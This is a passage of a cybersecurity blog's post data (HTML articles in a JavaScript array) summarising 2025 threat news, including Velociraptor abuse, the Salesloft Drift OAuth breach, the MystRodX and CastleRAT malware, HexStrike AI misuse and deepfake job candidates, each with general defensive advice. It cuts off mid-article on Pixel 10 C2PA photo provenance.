    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>TamperedChef</b> proves that malware doesn’t need to strike instantly to be effective. 
        By waiting weeks before stealing data, it evades defenses and builds victim trust. 
        Users and organizations alike must rethink software download habits and adopt 
        layered defenses to outpace these stealthy campaigns.
      </p>
    </section>
  `},{id:"velociraptor-abuse-teams-phishing-2025",title:"When Trusted Tools Turn Rogue: Velociraptor Abuse & Fake IT Teams Chats",summary:"Attackers weaponize a legitimate forensic tool and impersonate IT staff to steal credentials.",date:"2025-09-01",author:"EthicalByte",tags:["Velociraptor","Malware","Microsoft Teams","Phishing","Forensic Tools"],imageKey:"velociraptorAbuseBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 Trusted Tools, Twisted Purposes</h3><br>
      <p>
        Attackers are now abusing <b>Velociraptor</b>, a legitimate open-source forensic tool, to sneak into enterprise 
        networks. At the same time, they’re launching <b>fake IT support chats</b> on <b>Microsoft Teams</b> — 
        tricking employees into handing over credentials or installing malware.  
      </p>
      <p>
        This dual-pronged campaign shows a dangerous shift: adversaries are moving away from sketchy tools and 
        toward <b>trusted platforms</b> to gain persistence and credibility inside organizations.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
     <br> <h3 style="color:#facc15;">⚙️ How the Attack Works</h3><br>
      <p>
        <b>Step 1:</b> Velociraptor, normally used for forensic investigations, is deployed by attackers to quietly collect 
        system data and map the environment.  
      </p>
      <p>
        <b>Step 2:</b> Employees receive what appears to be a legitimate <b>IT support message</b> in Microsoft Teams. 
        The attackers impersonate internal staff, claiming “system updates” or “security fixes” are needed.  
      </p>
      <p>
        <b>Step 3:</b> Victims are tricked into sharing login credentials or downloading malware disguised as updates, 
        giving attackers direct access to critical accounts and systems.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
    <br>  <h3 style="color:#34d399;">🚨 Why It’s Dangerous</h3><br>
      <p>
        By abusing Velociraptor, attackers gain <b>legitimate visibility</b> into endpoints — the same way defenders do. 
        Combined with phishing inside a trusted collaboration platform like Teams, detection becomes much harder.  
      </p>
      <p>
        Traditional defenses rarely flag these moves, since both the forensic tool and Teams are seen as 
        “safe” by default. This lets adversaries operate <b>under the radar</b> while quietly escalating privileges.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
     <br> <h3 style="color:#2563eb;">🛡️ Defense Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Audit and restrict use of admin/forensic tools like Velociraptor</li>
        <li>✔️ Monitor Teams chats for suspicious impersonation attempts</li>
        <li>✔️ Use strong MFA to reduce risk of stolen credentials</li>
        <li>✔️ Train employees to verify IT requests through official channels</li>
        <li>✔️ Deploy behavioral analytics to flag abnormal data collection</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
     <br> <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The abuse of <b>Velociraptor</b> and impersonation on <b>Microsoft Teams</b> prove a key reality: 
        even trusted tools and platforms can become attack vectors in the wrong hands.  
        Organizations must treat every login, chat, and tool invocation as potential risk — and 
        secure both human and technical trust boundaries before adversaries exploit them.  
      </p>
    </section>
  `},{id:"zscaler-salesloft-drift-breach-2025",title:"Zscaler Caught in Salesloft Drift OAuth Breach",summary:"Attackers accessed Salesforce data, exposing customer contacts, licensing info, and case details.",date:"2025-09-02",author:"EthicalByte",tags:["Zscaler","Salesloft","OAuth Breach","Supply Chain Attack","Salesforce"],imageKey:"zscalerSalesloftBreachBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">🚨 The Breach Update</h3><br>
      <p>
        Security firm <b>Zscaler</b> has confirmed it is the latest victim of the ongoing <b>Salesloft Drift OAuth breach</b>. 
        Attackers gained access to its <b>Salesforce instance</b>, exfiltrating <b>customer contact information</b>, 
        <b>licensing details</b>, and portions of <b>support case text</b>.  
      </p>
      <p>
        While Zscaler reports <b>no evidence of misuse</b> so far, the fact that trusted SaaS integrations can lead to 
        this kind of exposure highlights the fragility of the <b>cloud supply chain</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How the Attack Worked</h3><br>
      <p>
        The breach is tied to the earlier compromise of <b>Salesloft Drift OAuth tokens</b>, which granted unauthorized 
        access to integrated apps. For Zscaler, this meant attackers could pull data directly from Salesforce without 
        needing to breach the company’s own systems.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 OAuth tokens abused for seamless access</li>
        <li>📂 Customer & licensing data exfiltrated</li>
        <li>📝 Support case text partially exposed</li>
        <li>🚫 No direct breach of Zscaler’s core systems</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        This isn’t just about Zscaler — it’s about the risks of <b>OAuth-based trust chains</b>. 
        Attackers no longer need to breach your firewall or servers; compromising a third-party app 
        integrated with your systems can yield the same access.  
      </p>
      <p>
        With more organizations connecting SaaS platforms for workflows, <b>identity and integration 
        security</b> is becoming just as critical as endpoint and network defense.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Response & Defense</h3><br>
      <p>
        Zscaler responded by <b>revoking unauthorized access</b> and <b>rotating all affected tokens</b>. 
        Customers have been notified, and additional monitoring is in place.  
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Review SaaS integrations and OAuth permissions</li>
        <li>✔️ Rotate credentials and tokens regularly</li>
        <li>✔️ Enforce least-privilege for API and app access</li>
        <li>✔️ Monitor for unusual access patterns in Salesforce & SaaS apps</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        The Zscaler incident proves a critical point: <b>OAuth token abuse is the new attack vector</b>. 
        Defenders must treat third-party SaaS connections with the same scrutiny as external logins, 
        because one weak link in the trust chain can expose even the most security-conscious companies.
      </p>
    </section>
  `},{id:"mystrodx-backdoor-espionage-2025",title:"MystRodX: The Stealth Backdoor Built for Espionage",summary:"A secret-triggered malware linked to China’s Liminal Panda espionage group.",date:"2025-09-03",author:"EthicalByte",tags:["MystRodX","Backdoor","Espionage","APT","Liminal Panda"],imageKey:"mystrodxBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">💀 A Backdoor That Waits for the Ping</h3><br>
      <p>
        Security researchers have uncovered <b>MystRodX</b>, a stealthy backdoor designed for <b>long-term espionage operations</b>. 
        What makes it unique? It doesn’t constantly beacon to command-and-control servers. 
        Instead, MystRodX stays <b>silent and hidden</b> until it receives a carefully crafted <b>secret network ping</b>.  
      </p>
      <p>
        Once activated, it quietly opens the door for attackers to exfiltrate data, move laterally, 
        and manipulate systems without triggering early alerts.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙️ How MystRodX Works</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛠 Installs silently on compromised systems, blending in with normal processes</li>
        <li>🕒 Remains dormant until triggered via a <b>covert ping sequence</b></li>
        <li>📂 Once active, enables file theft, system manipulation, and persistence</li>
        <li>🧩 Uses <b>modular components</b> to adapt for espionage targets</li>
      </ul>
      <p>
        This “sleep-until-called” design minimizes detection, making it ideal for nation-state spying.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to Liminal Panda</h3><br>
      <p>
        Researchers have attributed MystRodX to <b>Liminal Panda</b>, a Chinese state-backed espionage group known 
        for targeting governments, defense contractors, and high-value enterprises.  
      </p>
      <p>
        The group is infamous for precision intrusions, stealthy persistence, and custom malware families 
        designed to <b>live off the land</b> and exploit trust boundaries.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Why It Matters</h3><br>
      <p>
        MystRodX highlights the growing sophistication of <b>espionage-focused malware</b>. 
        Instead of noisy ransomware-style attacks, the goal is <b>long-term infiltration and intelligence gathering</b>. 
        Organizations often remain compromised for months before detection.
      </p>
      <p>
        This type of malware is especially dangerous for <b>governments, defense, finance, and research institutions</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>MystRodX</b> is not built for chaos — it’s built for control.  
        By staying dormant until the right moment, it shows how espionage actors are evolving 
        to stay invisible while extracting maximum value.  
        The takeaway? <b>Silence doesn’t mean safety</b>. Dormant threats may already be lurking in your network.
      </p>
    </section>
  `},{id:"hexstrike-ai-weaponized-2025",title:"HexStrike AI: From Ethical Hacking Tool to Weaponized Exploit Engine",summary:"Hackers are abusing HexStrike AI to exploit Citrix flaws at scale.",date:"2025-09-04",author:"EthicalByte",tags:["HexStrike AI","Citrix","Exploits","AI in Cybercrime","Vulnerability"],imageKey:"hexstrikeAiWeaponizedBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ef4444;">⚠ When Defense Tools Turn Against Us</h3><br>
      <p>
        <b>HexStrike AI</b>, a platform originally built for <b>ethical hacking and security testing</b>, 
        has now been co-opted by cybercriminals. Researchers confirm that attackers are already using it to 
        exploit <b>fresh Citrix vulnerabilities</b>, turning a defensive innovation into an offensive cyber weapon.  
      </p>
      <p>
        What was designed to <b>protect networks</b> is now fueling <b>real-world cyberattacks at scale</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#facc15;">⚙ How HexStrike AI Is Being Misused</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Originally designed for ethical vulnerability scanning</li>
        <li>💥 Adapted by hackers to <b>exploit zero-day and unpatched flaws</b></li>
        <li>📡 Current focus: <b>Citrix services</b>, already under active attack</li>
        <li>🚀 Automation via AI means exploits happen <b>faster and at larger scale</b></li>
      </ul>
      <p>
        This shift underscores how <b>dual-use AI tools</b> can blur the line between security and exploitation.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0f766e,#134e4a); border-radius:12px; color:#f0fdfa; margin-top:15px;">
      <h3 style="color:#34d399;">🚨 Why It Matters</h3><br>
      <p>
        Citrix systems are widely deployed in <b>enterprises, governments, and critical infrastructure</b>. 
        With HexStrike AI automating the exploitation process, attackers can compromise targets at unprecedented speed.  
      </p>
      <p>
        This isn’t just a case of patched vs. unpatched — it’s about the <b>weaponization of AI security tools</b> 
        and the dangerous acceleration of the cyber threat lifecycle.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 What Organizations Should Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply Citrix patches <b>immediately</b> — assume exploitation is already happening</li>
        <li>✔ Monitor for abnormal traffic patterns from Citrix environments</li>
        <li>✔ Restrict external exposure of Citrix services where possible</li>
        <li>✔ Audit the use of AI-driven pentesting tools in your environment</li>
        <li>✔ Prepare for AI-assisted threat actors becoming the norm</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ef4444;">✅ Final Thoughts</h3><br>
      <p>
        <b>HexStrike AI</b> shows the double-edged nature of modern cybersecurity tools. 
        In the right hands, it’s a powerful defensive ally. In the wrong ones, it becomes an 
        <b>automated exploit engine</b>.  
        The takeaway is simple: <b>patch fast, monitor continuously, and plan for AI-driven adversaries</b>.
      </p>
    </section>
  `},{id:"genai-chatgpt-data-leak-2025",title:"Are Your Employees Leaking Secrets into ChatGPT?",summary:"Why most security tools can’t see GenAI traffic — and what that means for your data.",date:"2025-09-05",author:"EthicalByte",tags:["GenAI","ChatGPT","Data Loss Prevention","Insider Threat","AI Security"],imageKey:"genaiChatGPTLeakBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#111827,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Secrets Flowing Into ChatGPT</h3><br>
      <p>
        Right now, employees across industries may be pasting sensitive data — 
        <b>emails, files, API keys, intellectual property</b> — directly into <b>ChatGPT</b> 
        and other AI assistants. Once entered, this information leaves your environment 
        and enters an ecosystem that most <b>DLP (Data Loss Prevention) tools simply cannot see</b>.
      </p>
      <p>
        The result? An invisible insider threat channel where confidential business information 
        flows into AI systems beyond your control.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">🔍 Why DLP Tools Fail</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 GenAI traffic is often encrypted and routed outside standard corporate monitoring</li>
        <li>🤖 Most DLP tools were never designed to parse AI-specific data flows</li>
        <li>📡 Shadow IT: employees use personal devices & browsers beyond corporate visibility</li>
        <li>🕵️ Insider risk: sensitive content can be exposed without malicious intent</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">⚠️ Why This Matters</h3><br>
      <p>
        Generative AI introduces a <b>new blind spot</b> for enterprise security. 
        Unlike email or web uploads, AI interactions aren’t logged or monitored by default, 
        meaning critical intellectual property can leave the organization undetected.  
      </p>
      <p>
        In regulated industries like <b>finance, healthcare, and defense</b>, this creates 
        compliance and national security risks.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Deploy GenAI-aware monitoring solutions</li>
        <li>✔️ Set policies for what data can/cannot be entered into AI tools</li>
        <li>✔️ Train employees on AI data risks</li>
        <li>✔️ Monitor browser and endpoint activity for unauthorized AI usage</li>
        <li>✔️ Explore proxy-based inspection of AI traffic flows</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#111827); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        Generative AI is here to stay — but so is the risk of <b>accidental data exfiltration</b>.  
        If your security stack can’t see AI traffic, you’re already blind to one of the fastest-growing insider risks.  
        The fix isn’t blocking AI entirely, but <b>monitoring and governing its use responsibly</b>.
      </p>
    </section>
  `},{id:"castlerat-trojan-tag150-2025",title:"CastleRAT: TAG-150’s New Trojan Expands CastleLoader Operations",summary:"Python & C-based malware capable of stealing passwords, hijacking wallets, logging keys, and full PC takeover.",date:"2025-09-06",author:"EthicalByte",tags:["CastleRAT","TAG-150","Trojan","Malware","Cybercrime"],imageKey:"castleRATBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 Meet CastleRAT</h3><br>
      <p>
        A notorious cyber gang, <b>TAG-150</b>, has unveiled its latest weapon: <b>CastleRAT</b>, a 
        <b>Python & C-based trojan</b> engineered to expand their ongoing <b>CastleLoader operations</b>.  
        This new malware represents a dangerous step up in sophistication, combining multiple capabilities 
        into a single, powerful package.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙️ What CastleRAT Can Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔑 Steals saved <b>passwords</b> and credentials</li>
        <li>💰 Hijacks <b>cryptocurrency wallets</b></li>
        <li>⌨️ Logs <b>keystrokes</b> to capture sensitive input</li>
        <li>🖥️ Grants attackers <b>full remote control</b> over infected PCs</li>
      </ul>
      <p>
        Unlike one-dimensional malware, CastleRAT functions as an all-in-one espionage and theft tool — 
        maximizing attacker ROI per infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Linked to CastleLoader Campaigns</h3><br>
      <p>
        CastleRAT is not a standalone threat — it integrates seamlessly with TAG-150’s <b>CastleLoader ecosystem</b>, 
        allowing rapid deployment and chaining of multiple malware families.  
      </p>
      <p>
        This tight integration suggests TAG-150 is scaling its infrastructure for <b>massive, sustained cybercrime operations</b>.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ Defense Against CastleRAT</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Keep systems and apps patched to reduce initial infection vectors</li>
        <li>✔️ Deploy EDR solutions to detect trojan-like behaviors</li>
        <li>✔️ Monitor for unusual process injections and persistence attempts</li>
        <li>✔️ Train employees on phishing awareness — CastleLoader campaigns often start with malicious emails</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        With <b>CastleRAT</b>, TAG-150 proves its evolution from nuisance to a full-fledged cybercrime syndicate.  
        The malware’s ability to combine credential theft, crypto hijacking, and remote control makes it a 
        <b>serious threat to both individuals and enterprises</b>.  
        Defenders must recognize that today’s trojans are no longer simple — they’re multi-purpose weapons 
        embedded in larger, organized crime ecosystems.
      </p>
    </section>
  `},{id:"barrelfire-noisybear-kazakhstan-2025",title:"BarrelFire: Russia-Linked Hackers Breach Kazakhstan’s Energy Giant",summary:"NoisyBear group exploited stolen accounts to deliver malware and backdoors through fake IT emails.",date:"2025-09-08",author:"EthicalByte",tags:["BarrelFire","NoisyBear","KazMunaiGas","Energy Sector","Cyber Espionage","Russia-linked APT"],imageKey:"barrelFireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#f87171;">🚨 BarrelFire Targets KazMunaiGas</h3><br>
      <p>
        A <b>Russia-linked hacking group</b>, tracked as <b>NoisyBear</b>, has launched a sophisticated cyber operation 
        codenamed <b>BarrelFire</b> against Kazakhstan’s energy giant <b>KazMunaiGas</b>.  
        Attackers infiltrated the network using a <b>stolen employee account</b> to send 
        highly convincing <b>fake IT support emails</b> that contained booby-trapped ZIP files.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#334155); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#fbbf24;">⚙ Attack Methodology</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Spear-phishing emails disguised as IT support messages</li>
        <li>📦 ZIP archives containing hidden malware payloads</li>
        <li>🕵 Delivered a <b>remote access trojan (RAT)</b> for persistence</li>
        <li>🔓 Established a <b>backdoor channel</b> for long-term espionage</li>
      </ul>
      <p>
        By leveraging a real employee’s compromised account, attackers bypassed trust barriers and 
        significantly increased the success rate of infection.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#064e3b,#022c22); border-radius:12px; color:#d1fae5; margin-top:15px;">
      <h3 style="color:#34d399;">🔍 Why This Matters</h3><br>
      <p>
        Targeting <b>critical energy infrastructure</b> highlights the growing risk of 
        <b>state-linked cyber operations</b> in geopolitically sensitive regions.  
        The use of stolen credentials also underlines a persistent weakness: 
        <b>human identity remains the weakest link</b> in enterprise defenses.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡 Defensive Measures</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Enforce strong <b>MFA</b> to prevent stolen account abuse</li>
        <li>✔ Monitor <b>internal email anomalies</b> for insider-like threats</li>
        <li>✔ Deploy <b>EDR solutions</b> for detecting RAT activity</li>
        <li>✔ Conduct regular phishing simulations for staff awareness</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#f87171;">✅ Final Thoughts</h3><br>
      <p>
        The BarrelFire operation shows how quickly a single stolen credential can escalate 
        into a <b>nation-state level cyber threat</b>.  
        For industries like energy, defense must go beyond firewalls — 
        it requires a proactive <b>identity-first security strategy</b>.
      </p>
    </section>
  `},{id:"ai-deepfake-fake-hires-2025",title:"AI-Powered Fake Hires: When Hackers Join Your Team",summary:"Deepfake candidates are slipping past interviews, getting onboarded, and stealing keys from the inside.",date:"2025-09-11",author:"EthicalByte",tags:["Insider Threat","Deepfake","AI Fraud","Recruitment Security","Cybersecurity"],imageKey:"fakeHireBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#3a0ca3,#7209b7); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ffb703;">⚠ Hackers Aren’t Just Phishing — They’re Getting Hired</h3><br>
      <p>
        Cybercrime has entered the hiring process. Threat actors are now crafting <b>AI-generated resumes</b> and 
        using <b>deepfake video interviews</b> to infiltrate organizations. Unlike traditional phishing, these attacks 
        give adversaries <b>legitimate employee access</b> from day one. Once onboarded, they can quietly siphon off 
        <b>credentials, sensitive files, and even privileged keys</b> without raising alarms.
      </p>
      <p>
        This isn’t a “what if” scenario — it’s happening today, and companies that fail to recognize this new vector 
        risk <b>granting attackers the keys to their kingdom</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#00b4d8,#0077b6); border-radius:12px; color:#e0f7fa; margin-top:15px;">
      <h3 style="color:#ffdd00;">🕵 How Fake Hires Work</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📄 Hyper-polished <b>AI resumes</b> tailored to bypass HR filters</li>
        <li>🎥 <b>Deepfake interviewees</b> fool recruiters with realistic gestures & voices</li>
        <li>🔑 Successful candidates gain <b>system access, VPN credentials, and file shares</b></li>
        <li>🏃 After exfiltrating data or injecting malware, they vanish — leaving IT puzzled</li>
      </ul>
      <p>
        These aren’t isolated incidents. It’s a new <b>scalable model for insider threats</b>, 
        enabled by off-the-shelf AI tools.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#ff6f61,#d62828); border-radius:12px; color:#fff0f0; margin-top:15px;">
      <h3 style="color:#fff176;">🔍 Why This Is Different</h3><br>
      <p>
        Unlike malware or phishing emails that target the perimeter, fake hires bypass defenses by 
        <b>operating inside the network as trusted users</b>. Their actions blend in with legitimate activity, 
        making traditional monitoring tools blind to the threat. This marks a shift from external intrusion to 
        <b>internal compromise</b>, where the attacker already has what every hacker dreams of: valid credentials.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#fefae0,#faedcd); border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#d62828;">🛡 What Companies Must Do</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔ Apply <b>multi-layered identity verification</b> before and after hiring</li>
        <li>✔ Use <b>deepfake detection tools</b> during video interviews</li>
        <li>✔ Limit <b>system access</b> for new hires until trust is proven</li>
        <li>✔ Continuously <b>monitor behavioral anomalies</b> among employees</li>
      </ul>
      <p>
        Recruitment must now be treated with the same seriousness as endpoint security. Every hire is a potential 
        <b>attack surface</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#03045e,#023e8a); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffb703;">✅ Final Thoughts</h3><br>
      <p>
        Hackers no longer need to <b>break in</b> — they can <b>walk in with a fake identity</b>.  
        As AI-powered deception grows, <b>identity becomes the new security perimeter</b>.  
        Companies that fail to adapt their hiring and monitoring processes are inviting adversaries 
        to join their payroll.
      </p>
    </section>
  `},{id:"google-pixel10-c2pa-2025",title:"Google Pixel 10 Adds Cryptographic Photo Labels",summary:"Pixel Camera becomes the first mobile device with top-rated C2PA authenticity tech",date:"2025-09-12",author:"EthicalByte",tags:["Google Pixel 10","C2PA","AI Authenticity","Deepfake Defense","Mobile Security"],imageKey:"pixel10C2PABanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#072f40,#0b5962); border-radius:12px; color:#f3fbfb;">
      <h3 style="color:#7be3ff;">📸 Photos With Cryptographic "Nutrition" Labels</h3><br>
      <p>
        Google’s new <b>Pixel 10</b> ships with built-in <b>C2PA</b> support: each photo can include a cryptographically signed provenance block — a compact "nutrition label" that records who created the image, what edits were applied, and whether AI tools were involved.
        This is a major step toward verifiable media: photographers, editors, platforms, and consumers can now trace an image’s lineage in a tamper-evident way.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#061826,#12343a); border-radius:12px; color:#e9fbff; margin-top:15px;">
      <h3 style="color:#9ff7ea;">🔐 Why This Matters</h3><br>
      <p>
        As generative AI increases the volume and realism of synthetic media, provenance becomes a practical defense. Cryptographic labels enable:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>✔️ Immediate verification of origin and edit history</li>
        <li>✔️ Clear flags when AI-assisted editing or generation was used</li>
        <li>✔️ Platform signals to help automated moderation and newsroom verification</li>
      </ul>
      <p>
        Pixel 10 reaching a top security rating for C2PA on a mobile device is a first — and it pushes the industry standard for authenticity on everyday devices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#084c61,#0f6b78); border-radius:12px; color:#eafcff; margin-top:15px;">
      <h3 style="color:#c6fff5;">🔎 Technical Details (How It Works)</h3><br>
      <p>
        The camera app can generate a signed provenance manifest using device-bound keys. Key points:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔑 <b>Device attestation:</b> cryptographic keys anchored to the Pixel hardware sign the provenance metadata.</li>
        <li>🧾 <b>Provenance payload:</b> contains creator identity (optional), toolchain edits, timestamps, and flags for AI involvement per C2PA schemas.</li>
        <li>🔗 <b>Verification:</b> third parties can verify signatures against Google’s attestation service or via on-device checks.</li>
      </ul>
      <p>
        This model balances usability and security by embedding minimal, verifiable metadata that consumers and platforms can check quickly.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2940,#123249); border-radius:12px; color:#e6fbff; margin-top:15px;">
      <h3 style="color:#a7fff1;">⚠️ Limitations & Privacy Considerations</h3><br>
      <p>
        C2PA labels improve transparency, but they aren’t a silver bullet. Key caveats:
      </p>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🕵️ <b>False trust risk:</b> provenance proves origin and edits, not intent — manipulated content can still be harmful.</li>
        <li>🔁 <b>Label removal:</b> metadata can be stripped if files are edited/exported improperly — platforms must preserve provenance.</li>
        <li>🔒 <b>Privacy trade-offs:</b> embedding creator identity is optional; implementers must balance attribution with user privacy and consent.</li>
      </ul>
      <p>
        Organizations must pair provenance with contextual checks (source reputation, content analysis) for robust trust decisions.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#f7fbff,#e6f7fb); border-radius:12px; color:#04292f; margin-top:15px;">
      <h3 style="color:#05668d;">🌍 Real-World Impact</h3><br>
      <ul style="margin-left:20px; line-height:1.7; color:#023e4a;">
        <li>📰 <b>Newsrooms:</b> Faster verification workflows for user submissions and social posts.</li>
        <li>⚖️ <b>Legal & Forensics:</b> Better provenance data for chain-of-custody in investigations.</li>
        <li>📱 <b>Social platforms:</b> Automated signals to reduce spread of manipulated media and label suspect content.</li>
      </ul>
      <p style="color:#033b45;">
        Over time, provenance at source could significantly reduce the effectiveness of deepfake disinformation campaigns.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#e8f8f9,#dff3f5); border-radius:12px; color:#022f34; margin-top:15px;">
      <h3 style="color:#017a9b;">🛠 Implementation Notes for Organizations</h3><br>
      <ul style="margin-left:20px; line-height:1.7;">
        <li>🔁 Ensure ingestion pipelines preserve C2PA metadata (don’t strip manifests during re-encoding).</li>
        <li>🔍 Integrate provenance checks into editorial and moderation tooling.</li>
